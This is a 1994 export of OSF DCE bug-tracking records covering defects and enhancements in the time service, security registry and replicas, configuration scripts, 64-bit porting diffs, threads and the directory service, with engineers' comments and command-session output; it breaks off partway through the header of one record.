S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : libutc
Short Description             : semaphore code needs rework
Reported Date                 : 8/26/94
Found in Baseline             : 1.1b16
Found Date                    : 8/26/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/26/94 public]

The user-mode implementation of the utc_gettime() and utc_adjtime()
calls utilize a shared memory segment protected by a read and write
semaphore. There are a couple latent problems with this code as
written.

+ No return values are checked for the semaphore operations code.

+ The semaphore operations need SEM_UNDO in order to avoid leaving the 
semaphores in an wrong state should the calling program crash during 
the lock/unlock operations (filed as a defect in related bug)



CR Number                     : 11886
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_rgy_rep_admin_become_master() API changes a master to a slave replica.
Reported Date                 : 8/25/94
Found in Baseline             : 1.1b16
Found Date                    : 8/25/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/25/94 public]

I have a master and 1 slave replica in my cell configuration. I invoke
the become -master command on a master replica. This produces an
error message but the sec_rgy_rep_admin_become_master() API performs
some work that makes the master a slave replica.


Try this:

>sec_admin
sec_admin> lrep -all

Default replica:  /.../dcecp_cell.osf.org/subsys/dce/sec/master
Default cell:     /.../dcecp_cell.osf.org


subsys/dce/sec/master (master)
Instance id: 4216c210-bfa5-11cd-96c2-0800092734a4
Addresses: ncacn_ip_tcp:130.105.5.121[]
           ncadg_ip_udp:130.105.5.121[]
State:                   in service - master
Last update received at: Thu Aug 25 11:15:39 1994
Last update's seqno: 0.529

subsys/dce/sec/ice
Instance id: e0ed07a7-c012-11cd-bb6f-0000c0239a70
Addresses: ncacn_ip_tcp:130.105.5.45[]
           ncadg_ip_udp:130.105.5.45[]
State:                   in service - slave
Last update received at: Thu Aug 25 11:15:39 1994
Last update's seqno: 0.529
Propagation state: ready for updates 
Last update delivered: Thu Aug 25 11:15:39 1994 
Last update's seqno: 0.529 
Number of outstanding updates: 0 
Last comm status:        Successful completion (dce / svc)

sec_admin> become -master
Do you wish to continue (y[es]) or abort this operation (n[o])? y
Become operation failed - Replica is the master (dce / sec)


This is a good error message, however....


sec_admin> site subsys/dce/sec/master
Default replica:  /.../dcecp_cell.osf.org/subsys/dce/sec/master
Default cell:     /.../dcecp_cell.osf.org

sec_admin> info -f

Default replica:  /.../dcecp_cell.osf.org/subsys/dce/sec/master
Default cell:     /.../dcecp_cell.osf.org
State:                   in service - slave
Last update received at: Thu Aug 25 11:15:39 1994
Last update's seqno:     0.529
Instance id: 4216c210-bfa5-11cd-96c2-0800092734a4
Addresses: ncacn_ip_tcp:130.105.5.121[] 
	   ncadg_ip_udp:130.105.5.121[]
Master id: 4216c210-bfa5-11cd-96c2-0800092734a4
Master address: ncacn_ip_tcp:130.105.5.121[]
		ncadg_ip_udp:130.105.5.121[]
Master seqno: 0.100 
Software version:        secd.dce.1.1


Note that the master replica is changed to a slave.

[10/12/94 public]

CR being removed from  unintegrated list until fix is known and
can be evaluated.

[10/14/94 public]
Returning this ot to it's natural state - priority had been raised as an
indication of wanting to get this into the unintegrated tree.



CR Number                     : 11883
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : dce.h
Short Description             : unsigned64/signed64 definition on 32bit platforms does not match hyper
Reported Date                 : 8/25/94
Found in Baseline             : 1.1
Found Date                    : 8/25/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dce.h,dce64,h,time/*
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/25/94 public]
The 32bit definitions of unsigned32 and idl_uhyper_int are reversed and the
names of the fields differ.  This makes it hard to use the definitions for
types going over the wire.  At the very least the ordering needs to be made
consistant.  The best would be to define unsigned64 it the same place as
unsinged32 and use a typedef.

[8/26/94 public]
Janet will do the code, and either check it in, or hand it off to
someone here to do.  (I thought I got e-mail saying this, but maybe
someone just told me.  I'll poll later to check.)

[9/6/94 public]
Last week Janet said she'd get to it this week.

[9/23/94 public]
Janet submitted yesterday (about 15 files affected).  I'll close after
trying a successful nightly build (places that us 64-bit numbers).

[09/26/94 public]
It was tried, it broke the build, and it was backed out.  This is now
scheduled for 1.2.  Maybe unintegrated -- we'll see.

[10/19/94 public]

We have a fix if you want it in unintegrated.

From:	JFCL::lo "York Lo  14-Oct-1994 1521" 14-OCT-1994 15:21:34.90
To:	tuxedo::mccann
CC:	tuxedo::comuzzi, tuxedo::a_ferris, lo
Subj:	unsigned64 struct change.

Hi Janet,

unsigned64/signed64 struct changes from your sandbox was built with the latest
R1.1 tree, and tested on both of tinman(intel) and akimbo(hp) ssytems without 
any problem.  The following is the details of the testing:
	1) rantest_api passed on both system (utc_* apis test).
	2) dtsd can synchronize with the null time provider(on akimbo system).
	3) dtsd from tinman system can synchronize with the dtsd from akimbo.
	4) all of the characteristics and counters of dts can be shown correctly
		on both systems.

[2/6/96 public]
What is the status of this OT? The information here isn't enough. Can Rich S.
look into this one and update the status? Thanks!

[9/3/96 public]
Downgraded to enhancement request - the most appropriate status due to lack
of feedback and nature of defect.



CR Number                     : 11878
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : rc.dce should not set all those env variables
Reported Date                 : 8/25/94
Found in Baseline             : 1.1b14
Found Date                    : 8/25/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/25/94 public]
/etc/rc.dce (indirectly) sets 30+ environment variables.  Most of these
are appropriate only for dce_config.  Every server run from there will
have all these set, as will servers started by DCED.  Probably none of
these should be set at all.

[8/25/94 public]
Actually, due to the way in which dce_com_utils is used in rc.dce,
a good number of these variables *are* used.

For instance log_msg needs several variables set, and $DCELOCAL is
used extensively.

There is no harm in having these variables set, why do we care?

[08/26/94 public]
I think that daemonrunning in rc.dce should be written like this:
	if [ $? -ne 0 ] ; then
	    [ -x $1 ] || return 0
	    echo "\t$*"
	    ARGS=$* ; export ARGS
	    # This assignment should probably really be in dce_config_env
	    # I believe, sigh, it is not complete.
	    CRUFT="${DCE_VAR_LIST} ${DCE_PASS_LIST}
		exit_on_err do_checks sec_client_service celladmin
		cellpw tol_sec default_max_id hpdce_debug default_pw"
	    (
		unset ${CRUFT}
		$*
	    )
	fi

Or if "typeset" is in the Posix sh, then do this:
	typeset +x ${CRUFT}
	$*
	typeset -x ${CRUFT}
and avoid the subshell.

Now, why should this be done?  Well since the cleanliness argument
doesn't sway you (and it should) how about the variables in DCE_PASS_LIST;
should all DCE servers really have them in their environment?  No.

[8/29/94 public]
No need to get so complex, how about using the 'env -i' command
to exec the command without the inherited environment?

This is much simpler and will accomplish what you want.
It also avoids hacking the config scripts this late in the game.

[08/29/94 public]
No env -i won't work because any SVC environ settings will have
been lost.  I thought about it and this seemed the only way to strip
out the gunk dce_config added.



CR Number                     : 11864
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpccp
Short Description             : rpccp show group -m and -r problem
Reported Date                 : 8/24/94
Found in Baseline             : 1.0.3
Found Date                    : 8/24/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/24/94 public]


"rpccp show group" can take -m for a specific member name. it can also take
"-r [level]" for recursive search. One could expect the two options to work
together. Not!

If the membername is not in the first level, no more recursive search will
happen. If the first level search succeeds, then if the member is an entry, it
stops there, no more recursive search; if the member is a group, it will
search the elements of the group, with the search member as itself. So it will
not succeed unless it is also has itself as a member. Then bad things happen of
course since no loop detection is implemented here.

So it seems to me that the original designer for show group never meant for -m
and -r to work together.  Otherwise the code is broken.



CR Number                     : 11817
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Misleading KDC Measage when
"good-since" date postdates current time
Reported Date                 : 8/22/94
Found in Baseline             : 1.0.3,1.1
Found Date                    : 8/22/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : krb5/kdc/do_as_req.c
Sensitivity                   : public

[8/22/94 public]

When you try to log into an account when the "good since date" of the
account postdates the current time, you get the KDC_ERR_CLIENT_NOTYET
message.  The associated text is:

Client not yet valid - try again later

A better message would be "account not yet valid for login".  "Client" in
DCE can mean lots of things, and someone could interpret the above message 
to mean that a DCE client was improperly configured or started.

[8/22/94 public]

Would "Client account not yet valid" satify you?

[8/23/94 public]

Yes. That's fine.



CR Number                     : 11755
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : 64 bit porting changes
Reported Date                 : 8/18/94
Found in Baseline             : 1.1
Found Date                    : 8/18/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/18/94 public]

The following files needed to be modified to run on a 64 bit platform:

    evt_read.c
    sec_login_pvt.c
    rsdb_attr_schema.c
    rsdb_acct.h
    kinit.c
    rsdb_acl.c
    rsdb_attr.c

The following are the diffs of the changes:

==========================================================
diff evt_read.c /project/dce/build/dce1.1/src/security/audit/libaudit/evt_read.c
774,777d773
< #if LONG_BIT >= 64
<                  sprintf(strbuf+strlen(strbuf), "hyper int %ld\n",
<                         tail->info_item[i].tagged_union.hyper_int);
< #else
782d777
< #endif
797,800d791
< #if LONG_BIT >= 64
<                 sprintf(strbuf+index, "uhyper int %ld\n",
<                      tail->info_item[i].tagged_union.uhyper_int);
< #else
805d795
< #endif

==========================================================
diff sec_login_pvt.c /project/dce/build/dce1.1/src/security/client/login/sec_login_pvt.c
1786c1786
<     *unix_projlist = (signed32 *) malloc(num_groups * sizeof(signed32));
---
>     *unix_projlist = (long *) malloc(num_groups * sizeof(signed32));


==========================================================
diff rsdb_attr_schema.c /project/dce/build/dce1.1/src/security/server/rsdb/rsdb_attr_schema.c
262c261
<     signed32          sch_entry_len;
---
>     long              sch_entry_len;

==========================================================
diff rsdb_acct.h /project/dce/build/dce1.1/src/security/h/rsdb_acct.h
253,254c253,254
<     signed32              max_num,            /* [in] */
<     signed32              *(num_returned),    /* [out] */
---
>     long                  max_num,            /* [in] */
>     long                  *(num_returned),    /* [out] */
256,257c256,257
<     signed32              *unix_projlist,     /* [out] */
<     signed32              *(num_projects),    /* [out] */
---
>     long                  *unix_projlist,     /* [out] */
>     long                  *(num_projects),    /* [out] */

==========================================================
diff kinit.c /project/dce/build/dce1.1/src/security/krb5/clients/kinit/kinit.c
419c419
<         signed32 ticket_expiration;
---
>         long ticket_expiration;

==========================================================
diff rsdb_acl.c /project/dce/build/dce1.1/src/security/server/rsdb/rsdb_acl.c
1107,1108c1107
<     long                    name_key_len = sizeof(name_key);
---
>     signed32                    name_key_len = sizeof(name_key);
1110,1111c1109
<     long                    plen;
---
>     signed32                    plen;

==========================================================
diff rsdb_attr.c /project/dce/build/dce1.1/src/security/server/rsdb/rsdb_attr.c
679c678
<     signed32          attr_inst_len;
---
>     long              attr_inst_len;

[9/1/94 public]
In most of these files, you suggest changing a type "long" to type "signed32",
but in rsdb_acl.c, you suggest changing type "signed32" to type "long".  Is this
actually correct?  I am unable to verify the changes without a 64-bit architecture.

[9/7/94 public]
The priority of this defect has been dropped to indicate that this will
not be fixed in the mainline, instead it will be put in the unintegrated
tree.  We do still need input from DEC on this.

[9/7/94 public]
For rsdb_acl.c, the change should be from "signed32" to type "long".  The
reason for this is the function rsdb_util_get_key_of_id() expects a pointer
to type long as its 4th parameter.  Every other place this function is
called the type of parameter passed is a pointer to long.  On a 64 bit
machine "signed32" is not the same as "long".

Another possible fix would be to change the function rsdb_util_get_key_of_id
so it expects a pointer to signed32 and change all invocations that currently
pass a pointer to long.  This fix would be prefered.

[10/5/94 public]
We had bumped this from the mainline per Bob Hathaway's request (timing of
the submission) and the plan was for it to go into the unintegrated tree.
We still plan to do this.

[10/12/94 public]
Removed from unintegrated tree list.

[10/14/94 public]
Returning this ot to it's natural state - priority had been raised as an
indication of wanting to get this into the unintegrated tree.



CR Number                     : 11754
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : need to include stdio.h
Reported Date                 : 8/18/94
Found in Baseline             : 1.1
Found Date                    : 8/18/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/18/94 public]

The following file need to include stdio.h :

    sec_login_pag.c
    sec_login_util.c

[8/24/94 public]
Could you provide information on why these files needs to include
stdio.h?  They have been building successfully on the reference
machines.

[8/24/94 public]
sec_login_pag.c uses sprintf(), so it should have stdio.h for the prototypes
(will build on many platforms without it, but it still should be included)

sec_login_util.c uses strcmp et al, but I don't see any stdio type stuff, so
I would argue that it really wants <string.h>

[9/7/94 public]
The priority of this defect has been dropped to indicate that this will
not be fixed in the mainline, instead it will be put in the unintegrated
tree.  We do still need input from DEC on this

[9/07/94 public]

sec_login_pag.c needs the definition of stderr and sec_login_util.c 
needs the definition of FILE.  Both of these are defined in stdio.h.

When compiling with ANSI C not having these defined causes compilation
errors.

Why are you putting these in the unintegrated tree?  This is such
and easy change.

[10/5/94 public]
We had bumped this from the mainline per Bob Hathaway's request (timing of
the submission) and the plan was for it to go into the unintegrated tree.
We still plan to do this.

[10/05/94 public]
See my comments in OT CR 12503 for another take on this.

[10/12/94 public[]

Removed from unintegrated list.



CR Number                     : 11753
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : need to include stdlib.h
Reported Date                 : 8/18/94
Found in Baseline             : 1.1
Found Date                    : 8/18/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/18/94 public]

The following files need to include stdlib.h:

    rsdb_attr_schema.c
    rsdb_attr.c
    rs_reserved.c
    sec_rgy_attr.c
    rgy_create.c
    rpriv_attr.c

[8/24/94 public]
Why have these files been building successfully without stdlib.h to
date?  Could you provide more information on why stdlib.h needs to be
included?

[9/7/94 public]
The priority of this defect has been dropped to indicate that this will
not be fixed in the mainline, instead it will be put in the unintegrated
tree.  We do still need input from DEC on this

[9/07/94 public]

stdlib.h is needed to pick up the prototype for malloc which is
defined in stdlib.h.  When compiling with an ANSI C compiler, 
you get compiliation errors if this file is not included.

Why are you putting these changes in the unintegrated tree?
The fix is simple.

[10/5/94 public]
We had bumped this from the mainline per Bob Hathaway's request (timing of
the submission) and the plan was for it to go into the unintegrated tree.
We still plan to do this.

[10/12/94 public]

Removed from unintegrated list.



CR Number                     : 11718
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security replica
Short Description             : account pepper on replica is not the same as on master
Reported Date                 : 8/16/94
Found in Baseline             : 1.1b15
Found Date                    : 8/16/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/16/94 public]

While working on OT11489 (dce_login from 1.03 client crashes
1.1 secd replica), I uncovered a potentially serious bug.

The pepper for an account is not the same on a replica as it
is on the master. This information should be identical. 

I was using cell_admin to log in. I did not change the pepper
so it was using the default. On the master secd, the pepper was
the default. However, on the replica, it was not the default.
This can be reproduced by killing the master and forcing a log
in thru the replica. Then set a breakpoint in process_as_req()
in security/krb5/kdc/do_as_req.c and analyze client.salt_type.

[9/8/94 public]

This OT was opened based on code inspection instead of a buggy
behavior.  We verified the described scenario will cause a retry
effort but does not create a problem.  So it is down-graded to
E4.



CR Number                     : 11699
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : server rsdb
Short Description             : alias between cell and non-cell namespaces provokes error
Reported Date                 : 8/15/94
Found in Baseline             : 1.1
Found Date                    : 8/15/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/15/94 public]

Using the weekend build of 8/14/94, configured a single machine cell on HP.
The cell alias functionality is not working while using rgy_edit -al
option. Here is the info:

rgy_edit=> v
nobody                                        -2
root                                           0
daemon                                         1
sys                                            2
bin                                            3
uucp                                           4
who                                            5
mail                                           6
tcb                                            9
dce-ptgt                                      20
dce-rgy                                       21
cell_admin                                   100
krbtgt/hp_cell                             12439
rgy_edit=> add real_alias -al
Enter UNIX number: 12439
Enter full name: () 
Enter object creation quota: (unlimited) 
?(rgy_edit) Unable to add principal  "real_alias" - Uuid version invalid
(dce / sec)
Do you wish to try again  [y/n]? (n)

[8/15/94 public]
Pilot error; lowered priority.
You meant to do "add krbtgt/real_alias -al 12439"
                     ^^^^^^

[8/15/94 public]
This still does not work:
rgy_edit=> add krbtgt/real_alias -al 12439
?(rgy_edit) "12439" - Unknown or redundant keyword (Registry Editor/TTY
Interface)
 (dce / sad)

[8/15/94 public]
Ok, mixed our syntaxes & goofed...
You meant to do "add krbtgt/real_alias 12439 -al"
                     ^^^^^^^

[10/5/94 public]
Mike B pointed out that this was still open, with a misleading title.
Lowered priority; this is just baffling behavior ("don't do that").



CR Number                     : 11669
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : return better than CDS_ROOTLOST
Reported Date                 : 8/12/94
Found in Baseline             : 1.1b14
Found Date                    : 8/12/94
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/12/94 public]

> I didn't have intercell set up but tried: 
>
> dcecp> cdsalias cat /.../othercell
> Error: Requested operation would result in lost connectivity to root directory
>
>This is a weird error message to get if nothing else.

This error message is not specific to the cdsalias catalog command.  Any
CDS "show" seems to return this if you do not have read access.  Try
a "directory show /.../othercell" and you'll get the same message.  Offhand,
I don't know why the clerk or server returns CDS_ROOTLOST in this case, but
if this message is bothersome, then a separate OT should be opened.

--Roger Zee



CR Number                     : 11653
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cache/clerk
Short Description             : clear cached server misleading
Reported Date                 : 8/11/94
Found in Baseline             : 1.1
Found Date                    : 8/11/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/11/94 public]
The documentation says that "clear cached server" "removes
knowledge of a server". Now, the code only removes the cache
clearinghouse entry, but does not scrub the directory entries.
If the clerk gets a match on a directory it can still get
to that clearinghouse, can't it? And if it does get there,
doesn't the clearinghouse get deposited back in the clearinghouse
cache? I don't have time to verify, but someone should.

A customer could use this command, thinking that he/she has
stopped the clerk from using said clearinghouse, which would
be misleading.

This should probably be in the release notes.



CR Number                     : 11639
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12864
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : cell alias account doesn't "float"
Reported Date                 : 8/10/94
Found in Baseline             : 1.1b14
Found Date                    : 8/10/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/10/94 public]
For tracking:  cell accounts are currently associated with the original
principal name of a cell, so if aliases are added, the primary name is
changed, and the original name is deleted, the account is deleted as well.

[9/6/94 public]
Dropped the priority to 2 to indicate that this does not need to be fixed
in the DCE 1.1 mainline.  This is planned for unintegrated, but could be
"fixed with documentation" according to Rob.

[3/11/96 public]
Moot wrt unsupported cell rename functionality.



CR Number                     : 11626
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : Threads sets stdin to nonblocking and doesn't reset it (was "Interactive read of the password failed")
Reported Date                 : 8/9/94
Found in Baseline             : 1.1b12
Found Date                    : 8/9/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/9/94 public]
With last night's (8/8) build, on a 486:
    dcecp> login cell_admin
    Enter Password: 
    Error: Interactive read of the password failed
    dcecp> 

It does not wait at the "Enter Password", but immediately gives the error.
Works fine on HP.  I tried 2 different 486s, just to be sure it wasn't
the machine itself.

[8/9/94 public]
Could this be related to the editread changes Tom put in the other day?

[8/9/94 public]
It definitely looks suspect. krb5_read_password() hasn't changed in a very
long time. dcp_login() hasn't either. I'll go talk to Tom.

[8/9/94 public]
Very suspect. Removing the include from editline.c and rebuilding
libdceutils.a fixes the problem.

[8/18/94 public]
It's a threads issue (I won't say bug yet). CMA sets stdin to non-blocking
now that we are using the wrapped read() call in editline. This messes
up krb5_read_password() when it tries to read from stdin later. I tried
setting stdin back to blocking before krb5_read_password(), and it fixed the
486 and broke the HP. Reassigning to threads so the "right" thing can
happen.

[08/23/94 public]
There is a work-around.  Compile editline without pthread.h.  Change the
call to read() so that it calls threadsafe_read, which looks something
like this.  The second if test might be system-specific.
	size_t
	threadsafe_read(int fd, char *buffer, size_t size)
	{
	    size_t r;

	    for ( ; ; ) {
		r = read(fd, buffer, size);
		if (r > 0)
		    break;
		if (r == (size_t)-1 && errno == EAGAIN))
		    pthread_yield();
	    }
	    return r;
	}
Also change sysunix.c so that it has these lines:
	new.c_cc[VMIN] = 0;
	new.c_cc[VTIME] = 3;

[9/1/94 public]

Well, the change I'm about to submit for CR 10278 adds a new
dependency on pthread.h in editline.c.

[9/6/94 public]

dcecp uses the kerberos utility function krb5_read_password.  This
in turn, uses fgets, which is not wrapped. If any wrapped read
has been made on STDIN, the file descriptor will be set in non-blocking
mode (as it should) and the unaware fgets will return immediately.

The inclusion of pthread.h in editline.c probably caused dcecp to
switch from unwrapped to wrapped reads on STDIN, causing the above
issue.

I don't know why the problem does not show on the hp.
In any case due to the inclusion of pthread.h in read_pwd.c file
(via krb5.h), one assumes krb5_read_password should work in wrapped
mode and avoid unwrapped stdio calls.  I am going to open an OT
against krb5_read_password.

Finally notice that using fcntl within dcecp will fetch the wrapped
fcntl which will not set the file descriptor to blocking even if you
try to. It will only set the appropriate cma user flags for the file
descriptor, which are going to be relevant for wrapped calls only.

[9/6/94 public]

Filed CR 12058 against krb5_read_password.  I'll leave this open for
fix verification.

[9/20/94 public]
I'd still like to look at this but it's not as high a priority as other
things on my plate. It won't get done by 10/6. I will revisit it after the
10/6 main line freeze. Anything we do with it then will go into the 
unintegrated tree. Lowering the priority to reflect this.

[9/20/94 public]

I am going to summarize the history of the bug here, as well as spell out
the fact that the best option for the dcecp folks is probably to copy the
krb5_read_passwd in a file of their own, gut the fgets out and put in a
read loop.  Why this is not going to be done inside krb5_read_passwd is
part of how things unwrapped (so to speak).  Also if they put in the read
loop they do not need to call pthread_yield, since the read will in fact be
a cma_read.

This CR was filed because the passwd reading in dcecp would get bumped out
without reading anything. This started after Tom included <pthread.h> in
editline.c .  The effect was seen only on the 486, not on the HP.  Tom's
changes were due to the fact that within dtscp blocking reads in editline.c
where messing up the rpc runtime.

The main effect of including pthread.h would be to turn the reads in
editline.c into cma_read.  cma_read sets the file descriptor to
non-blocking, which is fine as long as it is accessed via cma calls
(wrapped calls).

But dcecp calls krb5_read_password which uses fgets.  Now the reference
implementation of cma stdio is primitive at best.  It does some locking but
calls the native libc stdio.  This in turn uses the system read.

The difference between what happens on the 486 and the HP is that on the
486 the system read finds the file descriptor in non-blocking mode and
returns before the user has input the passwd, whereas on HP the system
read, for not yet understood reasons blocks (but blocks the whole process,
not only the thread).

Although the discrepancy is a threads issue, neither behaviour is correct.
The real solution would be a real cma stdio library, with a cma_fgets
calling cma_read.  But this is not available, and in many places within
dce, work-arounds have been implemented, that avoid the use of stdio.

So I thought such a workaround could be put directly in the
krb5_read_password function.  And filed CR 12058.  I had some exchange with
the people at HP. They feel strongly against putting in such a workaround,
mostly because are wary of mixing reads with stdio, due to stdio buffering.
Although I think I have enough reasons to argue for the validity of the
read workaround, the HP folks decided that in fact did not want to put in a
workaround for a problem due to lack of real cma stdio.

Thus CR 12058 was turned from sec to threads.  Of course, a full cma stdio
is not going to be implemented any time soon.  So the only issue threads
can pick up is the different behaviour between the HP and the 486 platform
with respect to unwrapped reads.  Even fixing this so that the unwrapped
read behaves on the 486 as on the HP, the krb5 function as is (with the
fgets) may not be good for dcecp if its blocking can cause the same
problems blocking caused in dtscp.



CR Number                     : 11624
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gdad
Short Description             : Must restart gdad after name server data base edit.
Reported Date                 : 8/9/94
Found in Baseline             : 1.1b14
Found Date                    : 8/8/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/9/94 public]

After installing bl14.1 on two cells and setting up the cell
entries in DNS, an unauthenticated "cdscp show dir /.../<other cell>"
failed with the error

Requested entry does not existFunction: dnsEnumAttr
dnsEnumAttr: partial results = %x000000000000000000000000000000000000

Then I manually stopped gdad and started it again, and the
same command worked correctly. This "fix" worked in both cells.

[8/10/94 public]
I changed the short description to be clear as to what this ot says.
Unauthenticated intercell does work. The only question is does one
have to restart gdad after editing the name service data base. 

My guess is that gdad caches information which implies that if you
change the nameserver data base you must restart gdad but I'm not certain.
I never paid attention to the order I was doing this in in the past
but Rick is correct in that you must now restart gdad after a name server
update. I'll verify whether or not this is the correct behavior but
for now I'm going to lower the priority.

[08/12/94 public]
It's been awhile since I looked at gdad (raw Internet domain queries aren't
fun reading) but note that all DNS info has a TTL (time to live) field,
and if gdad is caching DNS lookups it shouldn't keep them longer then
the returned TTL.



CR Number                     : 11552
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : secd comm errors to pwd_strengthd retranslated
Reported Date                 : 8/3/94
Found in Baseline             : 1.1b13
Found Date                    : 8/3/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rs_pwd_mgmt.c
Sensitivity                   : public

[8/3/94 public]

If secd has problems communicating with the password strength server 
any rpc error will be pushed back over the wire and caught by the 
client binding code and treated as if it were a communications failure 
to secd. The client will then try to rebind to secd.

So far, some but not all of the rpc errors have been trapped and translated 
to a unique password strength server communication errors.

The rpc error should be logged via servicability before it is translated.

[08/19/94 public]

Bumped priority to P1. This is serious enough that it should be fixed
for DCE 1.1.

[08/31/94 public]

Lowered priority to 2. This is not as bad as I thought. Currently, all RPC
runtime errors which may conflict with the security client binding code are
translated to a more generic error (sec_pwd_mgmt_svr_unavail). However, the
real code should be logged via servicability so an admin can know how to
fix the problem.



CR Number                     : 11549
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login
Short Description             : If user is root, bypass sec_clientd(dced) for preauth
Reported Date                 : 8/3/94
Found in Baseline             : 1.1b13
Found Date                    : 8/3/94
Severity                      : C
